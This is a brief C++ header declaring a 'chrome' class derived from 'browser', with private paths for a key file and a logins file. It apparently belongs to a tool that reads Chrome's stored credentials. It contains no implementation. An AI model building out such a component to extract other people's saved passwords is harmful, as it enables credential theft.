#ifndef CHROME_HXX_INCLUDED
#define CHROME_HXX_INCLUDED

#include "browser.hxx"

#include <filesystem>

class chrome : public browser {
public:
    chrome();
    void get(void) override;

private:
    std::filesystem::path m_key_path, m_logins_path;

    std::filesystem::path get_base_path(void);
};

#endif // ifndef CHROME_HXX_INCLUDED
